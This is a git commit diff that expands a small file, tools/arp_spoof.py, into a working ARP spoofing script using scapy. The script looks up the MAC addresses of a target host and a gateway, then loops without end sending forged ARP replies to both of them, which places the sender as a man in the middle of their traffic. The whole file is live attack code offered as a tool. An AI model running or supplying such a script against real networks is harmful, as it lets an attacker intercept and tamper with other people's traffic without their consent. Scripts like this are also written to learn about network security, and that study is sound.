d99009dd18502c6e36bf8b7ee2f07832916c3087
Anish <113669810+anishalx@users.noreply.github.com>
2024-09-10 08:24:35 +0530

    Update arp_spoof.py

--- tools/arp_spoof.py
+++ tools/arp_spoof.py
@@ -1,7 +1,27 @@
 #!/usr/bin/env pyhton
 
 import scapy.all as scapy
+import time 
 
-packet = scapy.ARP(op=2, pdst="172.22.128.1",hwdst="F2-34-90-E9-2B-3F", psrc="10.30.0.1")
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast= broadcast/arp_request
+    answered_list =scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-scapy.send(packet)
+    return answered_list[0][1].hwsrc
+    
+def spoof(target_ip, spoof_ip):
+    target_mac= get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+sent_packets_counts = 0
+while True :
+    spoof("172.26.77.90", "172.26.64.1")
+    spoof("172.26.64.1", "172.26.77.90")
+    sent_packets_counts = sent_packets_counts +2
+    print("[+] packet sent : " + str(sent_packets_counts))
+    time.sleep(2)
+
+# get_mac("172.26.64.1")
